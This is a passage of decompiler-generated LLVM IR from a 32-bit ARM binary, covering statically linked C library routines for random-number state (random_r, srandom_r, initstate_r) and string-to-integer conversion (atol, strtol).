  %v2_1799c = inttoptr i32 %v1_1799c to i32*
  store i32 %v5_17998, i32* %v2_1799c, align 4
  br label %dec_label_pc_179a0

dec_label_pc_179a0:                               ; preds = %dec_label_pc_17950, %dec_label_pc_17978
  %v0_179a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_179a0 = load i32, i32* %r5.global-to-local, align 4
  %v4_179a0 = mul i32 %v1_179a0, 4
  %v5_179a0 = add i32 %v4_179a0, %v0_179a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_179a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_179a8 = add i32 %v1_179a8, 16
  %v3_179a8 = inttoptr i32 %v2_179a8 to i32*
  store i32 %v5_179a0, i32* %v3_179a8, align 4
  %v0_179ac = load i32, i32* %r6.global-to-local, align 4
  %v1_179ac = load i32, i32* %r4.global-to-local, align 4
  %v2_179ac = add i32 %v1_179ac, 8
  %v3_179ac = inttoptr i32 %v2_179ac to i32*
  store i32 %v0_179ac, i32* %v3_179ac, align 4
  %v1_179cc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_179c4

dec_label_pc_179b4:                               ; preds = %bb
  %v0_179b4 = call i32 @__GI___errno_location()
  %v2_179bc = inttoptr i32 %v0_179b4 to i32*
  store i32 22, i32* %v2_179bc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_179c4

dec_label_pc_179c4:                               ; preds = %dec_label_pc_179a0, %dec_label_pc_179b4
  %v1_179cc = phi i32 [ %v1_179cc.pre, %dec_label_pc_179a0 ], [ -1, %dec_label_pc_179b4 ]
  %v2_179c8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_179c8, i32* @r4, align 4
  ret i32 %v1_179cc

; uselistorder directives
  uselistorder i32 %v0_17990, { 1, 0 }
  uselistorder i32 %v2_1798c, { 1, 0 }
  uselistorder i32 %v3_17934, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 1, 2, 3, 4, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_179c4, { 1, 0 }
  uselistorder label %dec_label_pc_179a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_179d8 = load i32, i32* @r4, align 4
  store i32 %v3_179d8, i32* %stack_var_-8, align 4
  %v1_179dc = add i32 %tmp, 12
  %v2_179dc = inttoptr i32 %v1_179dc to i8*
  %v3_179dc = load i8, i8* %v2_179dc, align 1
  %v4_179dc = sext i8 %v3_179dc to i32
  store i32 %v4_179dc, i32* %r3.global-to-local, align 4
  %v2_179e0 = icmp eq i8 %v3_179dc, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_179ec = add i32 %tmp, 8
  %v2_179ec = inttoptr i32 %v1_179ec to i32*
  %v3_179ec = load i32, i32* %v2_179ec, align 4
  store i32 %v3_179ec, i32* %lr.global-to-local, align 4
  br i1 %v2_179e0, label %dec_label_pc_179f4, label %dec_label_pc_17a18

dec_label_pc_179f4:                               ; preds = %entry
  %v1_179f4 = inttoptr i32 %v3_179ec to i32*
  %v2_179f4 = load i32, i32* %v1_179f4, align 4
  store i32 %v2_179f4, i32* %r2.global-to-local, align 4
  %v2_179fc = mul i32 %v2_179f4, 1103515245
  %v1_17a04 = add i32 %v2_179fc, 12345
  %tmp6 = bitcast i32 %v1_17a04 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_17a08 = bitcast float %tmp7 to i32
  store i32 %v1_17a08, i32* %r3.global-to-local, align 4
  store i32 %v1_17a08, i32* %v1_179f4, align 4
  %v0_17a10 = load i32, i32* %r3.global-to-local, align 4
  %v2_17a10 = inttoptr i32 %arg2 to i32*
  store i32 %v0_17a10, i32* %v2_17a10, align 4
  br label %dec_label_pc_17a58

dec_label_pc_17a18:                               ; preds = %entry
  %v2_17a18 = load i32, i32* %arg1, align 4
  store i32 %v2_17a18, i32* %r2.global-to-local, align 4
  %v1_17a1c = add i32 %tmp, 4
  %v2_17a1c = inttoptr i32 %v1_17a1c to i32*
  %v3_17a1c = load i32, i32* %v2_17a1c, align 4
  store i32 %v3_17a1c, i32* %r0.global-to-local, align 4
  %v1_17a20 = inttoptr i32 %v2_17a18 to i32*
  %v2_17a20 = load i32, i32* %v1_17a20, align 4
  store i32 %v2_17a20, i32* %r1.global-to-local, align 4
  %v1_17a24 = inttoptr i32 %v3_17a1c to i32*
  %v2_17a24 = load i32, i32* %v1_17a24, align 4
  %v4_17a24 = add i32 %v3_17a1c, 4
  store i32 %v4_17a24, i32* %r0.global-to-local, align 4
  %v2_17a28 = add i32 %v2_17a24, %v2_17a20
  store i32 %v2_17a28, i32* %r3.global-to-local, align 4
  store i32 %v2_17a28, i32* %v1_17a20, align 4
  %v3_17a2c = load i32, i32* %r2.global-to-local, align 4
  %v4_17a2c = add i32 %v3_17a2c, 4
  store i32 %v4_17a2c, i32* %r2.global-to-local, align 4
  %v0_17a30 = load i32, i32* %ip.global-to-local, align 4
  %v1_17a30 = add i32 %v0_17a30, 16
  %v2_17a30 = inttoptr i32 %v1_17a30 to i32*
  %v3_17a30 = load i32, i32* %v2_17a30, align 4
  store i32 %v3_17a30, i32* %r1.global-to-local, align 4
  %v0_17a34 = load i32, i32* %r3.global-to-local, align 4
  %v3_17a34 = udiv i32 %v0_17a34, 2
  store i32 %v3_17a34, i32* %r3.global-to-local, align 4
  %v3_17a38 = icmp ult i32 %v4_17a2c, %v3_17a30
  %v1_17a3c = load i32, i32* %r4.global-to-local, align 4
  %v2_17a3c = inttoptr i32 %v1_17a3c to i32*
  store i32 %v3_17a34, i32* %v2_17a3c, align 4
  br i1 %v3_17a38, label %dec_label_pc_17a48, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_17a18
  %v1_17a40 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17a40, i32* %r2.global-to-local, align 4
  %v0_17a50.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17a48:                               ; preds = %dec_label_pc_17a18
  %v0_17a48 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a48 = load i32, i32* %r1.global-to-local, align 4
  %v3_17a48 = icmp ult i32 %v0_17a48, %v1_17a48
  br i1 %v3_17a48, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_17a48
  %v1_17a4c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17a4c, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_17a48, %._crit_edge, %bb
  %v0_17a50 = phi i32 [ %v0_17a50.pre, %._crit_edge ], [ %v0_17a48, %dec_label_pc_17a48 ], [ %v1_17a4c, %bb ]
  %v1_17a50 = load i32, i32* %ip.global-to-local, align 4
  %v2_17a50 = add i32 %v1_17a50, 4
  %v3_17a50 = inttoptr i32 %v2_17a50 to i32*
  store i32 %v0_17a50, i32* %v3_17a50, align 4
  %v0_17a54 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a54 = load i32, i32* %ip.global-to-local, align 4
  %v2_17a54 = inttoptr i32 %v1_17a54 to i32*
  store i32 %v0_17a54, i32* %v2_17a54, align 4
  br label %dec_label_pc_17a58

dec_label_pc_17a58:                               ; preds = %dec_label_pc_179f4, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_17a5c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17a5c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_17a34, { 1, 0 }
  uselistorder i32 %v1_17a08, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_17a58, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17a68 = load i32, i32* @r4, align 4
  store i32 %v3_17a68, i32* %stack_var_-36, align 4
  %v1_17a6c = add i32 %tmp, 12
  %v2_17a6c = inttoptr i32 %v1_17a6c to i8*
  %v3_17a6c = load i8, i8* %v2_17a6c, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_17a7c = load i8, i8* %v2_17a6c, align 1
  %tmp33 = icmp ugt i8 %v3_17a6c, 4
  br i1 %tmp33, label %.dec_label_pc_17b28_crit_edge, label %dec_label_pc_17a88

.dec_label_pc_17b28_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17b28

dec_label_pc_17a88:                               ; preds = %entry
  %v0_17a88 = load i32, i32* @r0, align 4
  %v2_17a88 = icmp eq i32 %v0_17a88, 0
  %v1_17a8c = add i32 %tmp, 8
  %v2_17a8c = inttoptr i32 %v1_17a8c to i32*
  %v3_17a8c = load i32, i32* %v2_17a8c, align 4
  store i32 %v3_17a8c, i32* %r6.global-to-local, align 4
  br i1 %v2_17a88, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_17a88
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_17a88, %bb
  %v0_17a98 = phi i32 [ %v0_17a88, %dec_label_pc_17a88 ], [ 1, %bb ]
  %v2_17a94 = icmp eq i8 %v3_17a7c, 0
  %v2_17a98 = inttoptr i32 %v3_17a8c to i32*
  store i32 %v0_17a98, i32* %v2_17a98, align 4
  br i1 %v2_17a94, label %dec_label_pc_17b24, label %dec_label_pc_17aa0

dec_label_pc_17aa0:                               ; preds = %bb23
  %v1_17aa0 = add i32 %tmp, 13
  %v2_17aa0 = inttoptr i32 %v1_17aa0 to i8*
  %v3_17aa0 = load i8, i8* %v2_17aa0, align 1
  %v4_17aa0 = sext i8 %v3_17aa0 to i32
  store i32 %v4_17aa0, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_17aac = load i32, i32* @r0, align 4
  store i32 %v0_17aac, i32* %r4.global-to-local, align 4
  %v0_17ab0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17ab0, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_17af025 = icmp sgt i8 %v3_17aa0, 1
  br i1 %v5_17af025, label %dec_label_pc_17abc, label %dec_label_pc_17af4

dec_label_pc_17abc:                               ; preds = %dec_label_pc_17aa0, %dec_label_pc_17abc.dec_label_pc_17abc_crit_edge
  %v1_17ad0 = phi i32 [ %v1_17ad0.pre, %dec_label_pc_17abc.dec_label_pc_17abc_crit_edge ], [ 2836, %dec_label_pc_17aa0 ]
  %v1_17ac4 = phi i32 [ %v1_17ac4.pre, %dec_label_pc_17abc.dec_label_pc_17abc_crit_edge ], [ 16807, %dec_label_pc_17aa0 ]
  %v0_17ac027 = phi i32 [ %v0_17ae4.pre, %dec_label_pc_17abc.dec_label_pc_17abc_crit_edge ], [ %v0_17aac, %dec_label_pc_17aa0 ]
  %v1_17adc26 = phi i32 [ %v5_17adc, %dec_label_pc_17abc.dec_label_pc_17abc_crit_edge ], [ %v0_17ab0, %dec_label_pc_17aa0 ]
  %v3_17abc = urem i32 %v0_17ac027, 127773
  %v2_17ac4 = mul i32 %v1_17ac4, %v3_17abc
  %v2_17acc = sdiv i32 %v0_17ac027, 127773
  %v2_17ad0 = mul i32 %v1_17ad0, %v2_17acc
  %v2_17ad4 = sub i32 %v2_17ac4, %v2_17ad0
  %v8_17ad4 = icmp slt i32 %v2_17ad4, 0
  %v2_17ad8 = add i32 %v2_17ad4, 2147483647
  %v2_17ad8.v2_17ad4 = select i1 %v8_17ad4, i32 %v2_17ad8, i32 %v2_17ad4
  store i32 %v2_17ad8.v2_17ad4, i32* %r4.global-to-local, align 4
  %v2_17adc = add i32 %v1_17adc26, 4
  %v3_17adc = inttoptr i32 %v2_17adc to i32*
  store i32 %v2_17ad8.v2_17ad4, i32* %v3_17adc, align 4
  %v4_17adc = load i32, i32* %r8.global-to-local, align 4
  %v5_17adc = add i32 %v4_17adc, 4
  store i32 %v5_17adc, i32* %r8.global-to-local, align 4
  %v0_17ae0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_17ae0.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17ae4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17aec = add i32 %v0_17ae0.pre, 1
  store i32 %v1_17aec, i32* %r7.global-to-local, align 4
  %v5_17af0 = icmp slt i32 %v0_17ae0.pre, %v1_17ae0.pre
  br i1 %v5_17af0, label %dec_label_pc_17abc.dec_label_pc_17abc_crit_edge, label %dec_label_pc_17ae0.dec_label_pc_17af4_crit_edge

dec_label_pc_17abc.dec_label_pc_17abc_crit_edge:  ; preds = %dec_label_pc_17abc
  %v1_17ac4.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_17ad0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17abc

dec_label_pc_17ae0.dec_label_pc_17af4_crit_edge:  ; preds = %dec_label_pc_17abc
  %v0_17b04.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17af4

dec_label_pc_17af4:                               ; preds = %dec_label_pc_17ae0.dec_label_pc_17af4_crit_edge, %dec_label_pc_17aa0
  %v0_17b04 = phi i32 [ %v0_17b04.pre, %dec_label_pc_17ae0.dec_label_pc_17af4_crit_edge ], [ %v0_17ab0, %dec_label_pc_17aa0 ]
  %v0_17af8.lcssa = phi i32 [ %v1_17ae0.pre, %dec_label_pc_17ae0.dec_label_pc_17af4_crit_edge ], [ %v4_17aa0, %dec_label_pc_17aa0 ]
  %v2_17af8 = mul i32 %v0_17af8.lcssa, 10
  store i32 %v2_17af8, i32* @r4, align 4
  %v0_17afc = load i32, i32* %r5.global-to-local, align 4
  %v1_17afc = add i32 %v0_17afc, 14
  %v2_17afc = inttoptr i32 %v1_17afc to i8*
  %v3_17afc = load i8, i8* %v2_17afc, align 1
  %v4_17afc = sext i8 %v3_17afc to i32
  %v2_17b00 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17b00, i32* %r7.global-to-local, align 4
  %v4_17b04 = mul nsw i32 %v4_17afc, 4
  %v5_17b04 = add i32 %v0_17b04, %v4_17b04
  %v1_17b08 = inttoptr i32 %v0_17afc to i32*
  store i32 %v5_17b04, i32* %v1_17b08, align 4
  %v3_17b08 = add i32 %v0_17afc, 4
  %v4_17b08 = inttoptr i32 %v3_17b08 to i32*
  %v5_17b08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_17b08, i32* %v4_17b08, align 4
  br label %dec_label_pc_17b14

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17b14
  %v0_17b18 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b10 = inttoptr i32 %v0_17b18 to i32*
  %v3_17b10 = call i32 @__GI_random_r(i32* %v2_17b10, i32 %v2_17b00)
  br label %dec_label_pc_17b14

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17af4, %dec_label_pc_17b10
  %v0_17b14 = load i32, i32* @r4, align 4
  %v1_17b14 = add i32 %v0_17b14, -1
  store i32 %v1_17b14, i32* @r4, align 4
  %v6_17b14 = icmp slt i32 %v1_17b14, 0
  br i1 %v6_17b14, label %dec_label_pc_17b24, label %dec_label_pc_17b10

dec_label_pc_17b24:                               ; preds = %dec_label_pc_17b14, %bb23
  %v2_17b2c.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17b28

dec_label_pc_17b28:                               ; preds = %.dec_label_pc_17b28_crit_edge, %dec_label_pc_17b24
  %v2_17b2c = phi i32 [ %v3_17a68, %.dec_label_pc_17b28_crit_edge ], [ %v2_17b2c.pre, %dec_label_pc_17b24 ]
  %v1_17b30 = phi i32 [ -1, %.dec_label_pc_17b28_crit_edge ], [ 0, %dec_label_pc_17b24 ]
  store i32 %v2_17b2c, i32* @r4, align 4
  ret i32 %v1_17b30

; uselistorder directives
  uselistorder i32 %v1_17b14, { 1, 0 }
  uselistorder i32 %v0_17afc, { 1, 0, 2 }
  uselistorder i32 %v0_17ae0.pre, { 1, 0 }
  uselistorder i32 %v5_17adc, { 1, 0 }
  uselistorder i32 %v0_17ac027, { 1, 0 }
  uselistorder i32 %v0_17ab0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_17b28, { 1, 0 }
  uselistorder label %dec_label_pc_17b14, { 1, 0 }
  uselistorder label %dec_label_pc_17abc, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17b34:
  %v0_17b34 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b34, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17b34
  %v2_17b34 = load i32, i32* @r7, align 4
  %v5_17b34 = udiv i32 %v2_17b34, 8
  %v6_17b34 = and i32 %v5_17b34, %arg1
  %v3_17b38 = load i32, i32* @fp, align 4
  %v8_17b38 = shl i32 %v6_17b34, %v3_17b38
  %v9_17b38 = and i32 %v8_17b38, %arg1
  %v2_17b3c = load i32, i32* @sp, align 4
  %v8_17b3c = shl i32 %v2_17b3c, %arg3
  %v9_17b3c = and i32 %v8_17b3c, %arg2
  call void @__pseudo_branch(i32 %v9_17b3c)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17b34, %bb
  %v10_17b3c = phi i32 [ %arg1, %dec_label_pc_17b34 ], [ %v9_17b38, %bb ]
  ret i32 %v10_17b3c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_17b40 = load i32, i32* @r4, align 4
  %v6_17b40 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_17b70, label %dec_label_pc_17b60

dec_label_pc_17b60:                               ; preds = %entry
  %v2_17b60 = icmp ugt i32 %arg2, 254
  %v7_17b60 = icmp eq i32 %arg2, 255
  %v2_17b64 = xor i1 %v7_17b60, true
  %v3_17b64 = and i1 %v2_17b60, %v2_17b64
  br i1 %v3_17b64, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_17b60
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17b60, %bb
  %v1_17b9c7 = phi i32 [ %v3_17b40, %dec_label_pc_17b60 ], [ 4, %bb ]
  %v2_17b68 = xor i1 %v2_17b60, true
  %v3_17b68 = or i1 %v7_17b60, %v2_17b68
  br i1 %v3_17b68, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_17b70:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_17b88, label %dec_label_pc_17b78

dec_label_pc_17b78:                               ; preds = %dec_label_pc_17b70
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_17bf8

.thread10:                                        ; preds = %dec_label_pc_17b78
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_17b88:                               ; preds = %dec_label_pc_17b70
  %v2_17b88 = icmp ugt i32 %arg2, 62
  %v7_17b88 = icmp eq i32 %arg2, 63
  %v2_17b8c = xor i1 %v7_17b88, true
  %v3_17b8c = and i1 %v2_17b88, %v2_17b8c
  br i1 %v3_17b8c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_17b88
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_17b88, %bb23
  %v1_17b9c6 = phi i32 [ %v3_17b40, %dec_label_pc_17b88 ], [ 2, %bb23 ]
  %v2_17b90 = xor i1 %v2_17b88, true
  %v3_17b90 = or i1 %v7_17b88, %v2_17b90
  br i1 %v3_17b90, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_17ba8 = phi i32 [ 3, %bb22 ], [ %v1_17b9c7, %bb21 ], [ %v1_17b9c6, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34412), i32* %r3.global-to-local, align 4
  %v4_17b9c = mul i32 %v1_17ba8, 4
  %v5_17b9c = add i32 %v4_17b9c, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34412)
  store i32 %v5_17b9c, i32* %r2.global-to-local, align 4
  %v1_17ba0 = add i32 %v4_17b9c, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34392)
  %v2_17ba0 = inttoptr i32 %v1_17ba0 to i32*
  %v3_17ba0 = load i32, i32* %v2_17ba0, align 4
  store i32 %v3_17ba0, i32* %r1.global-to-local, align 4
  %v1_17ba4 = add i32 %tmp, 4
  store i32 %v1_17ba4, i32* @r6, align 4
  %v6_17ba8 = inttoptr i32 %v5_17b9c to i32*
  %v7_17ba8 = load i32, i32* %v6_17ba8, align 4
  store i32 %v7_17ba8, i32* %r2.global-to-local, align 4
  %v4_17bac = mul i32 %v3_17ba0, 4
  %v5_17bac = add i32 %v4_17bac, %v1_17ba4
  store i32 %v5_17bac, i32* %r3.global-to-local, align 4
  %v2_17bb0 = add i32 %arg3, 16
  %v3_17bb0 = inttoptr i32 %v2_17bb0 to i32*
  store i32 %v5_17bac, i32* %v3_17bb0, align 4
  %v0_17bb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17bb4 = trunc i32 %v0_17bb4 to i8
  %v2_17bb4 = load i32, i32* @r5, align 4
  %v3_17bb4 = add i32 %v2_17bb4, 14
  %v4_17bb4 = inttoptr i32 %v3_17bb4 to i8*
  store i8 %v1_17bb4, i8* %v4_17bb4, align 1
  %v0_17bb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17bb8 = trunc i32 %v0_17bb8 to i8
  %v2_17bb8 = load i32, i32* @r5, align 4
  %v3_17bb8 = add i32 %v2_17bb8, 13
  %v4_17bb8 = inttoptr i32 %v3_17bb8 to i8*
  store i8 %v1_17bb8, i8* %v4_17bb8, align 1
  %v0_17bbc = load i32, i32* @r4, align 4
  %v1_17bbc = trunc i32 %v0_17bbc to i8
  %v2_17bbc = load i32, i32* @r5, align 4
  %v3_17bbc = add i32 %v2_17bbc, 12
  %v4_17bbc = inttoptr i32 %v3_17bbc to i8*
  store i8 %v1_17bbc, i8* %v4_17bbc, align 1
  %v0_17bc0 = load i32, i32* @r6, align 4
  %v1_17bc0 = load i32, i32* @r5, align 4
  %v2_17bc0 = add i32 %v1_17bc0, 8
  %v3_17bc0 = inttoptr i32 %v2_17bc0 to i32*
  store i32 %v0_17bc0, i32* %v3_17bc0, align 4
  %v0_17bc4 = load i32, i32* @r5, align 4
  store i32 %v0_17bc4, i32* %r1.global-to-local, align 4
  %v0_17bc8 = load i32, i32* @r0, align 4
  %v2_17bc8 = inttoptr i32 %v0_17bc8 to i32*
  %v3_17bc8 = call i32 @srandom_r(i32* %v2_17bc8, i32 %v0_17bc4)
  store i32 %v3_17bc8, i32* %r0.global-to-local, align 4
  %v0_17bcc = load i32, i32* @r4, align 4
  %v2_17bcc = icmp eq i32 %v0_17bcc, 0
  br i1 %v2_17bcc, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_17be812 = load i32, i32* @r7, align 4
  %v2_17be813 = inttoptr i32 %v1_17be812 to i32*
  store i32 0, i32* %v2_17be813, align 4
  %v1_17bec = load i32, i32* @r4, align 4
  store i32 %v1_17bec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c10

.thread4:                                         ; preds = %bb26
  %v1_17bd0 = load i32, i32* @r5, align 4
  %v2_17bd0 = add i32 %v1_17bd0, 4
  %v3_17bd0 = inttoptr i32 %v2_17bd0 to i32*
  %v4_17bd0 = load i32, i32* %v3_17bd0, align 4
  %v1_17bd4 = load i32, i32* @r6, align 4
  %v3_17bd4 = sub i32 %v4_17bd0, %v1_17bd4
  %v4_17bd8 = sdiv i32 %v3_17bd4, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_17be0 = mul i32 %v4_17bd8, 5
  %v5_17be0 = add i32 %v4_17be0, %v0_17bcc
  store i32 %v5_17be0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17be8 = load i32, i32* @r7, align 4
  %v2_17be8 = inttoptr i32 %v1_17be8 to i32*
  store i32 0, i32* %v2_17be8, align 4
  %v1_17bf0 = load i32, i32* %r3.global-to-local, align 4
  %v2_17bf0 = load i32, i32* @r7, align 4
  %v3_17bf0 = inttoptr i32 %v2_17bf0 to i32*
  store i32 %v1_17bf0, i32* %v3_17bf0, align 4
  %v1_17c18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c10

dec_label_pc_17bf8:                               ; preds = %dec_label_pc_17b78
  %v0_17bf8 = call i32 @__GI___errno_location()
  store i32 %v0_17bf8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_17c00 = inttoptr i32 %v0_17bf8 to i32*
  store i32 22, i32* %v2_17c00, align 4
  %v0_17c04 = call i32 @__GI___errno_location()
  %v0_17c08 = load i32, i32* %r4.global-to-local, align 4
  %v2_17c08 = inttoptr i32 %v0_17c04 to i32*
  store i32 %v0_17c08, i32* %v2_17c08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c10

dec_label_pc_17c10:                               ; preds = %bb27, %.thread4, %dec_label_pc_17bf8
  %v1_17c18 = phi i32 [ %v1_17c18.pre, %.thread4 ], [ %v1_17bec, %bb27 ], [ -1, %dec_label_pc_17bf8 ]
  store i32 %v3_17b40, i32* @r4, align 4
  store i32 %v6_17b40, i32* @r5, align 4
  ret i32 %v1_17c18

; uselistorder directives
  uselistorder i1 %v7_17b88, { 1, 0 }
  uselistorder i1 %v7_17b60, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34412), { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %dec_label_pc_17c10, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_17c34 = call i32 @strtol()
  ret i32 %v0_17c34
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_17c50 = call i32 @_stdlib_strto_l()
  ret i32 %v0_17c50
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
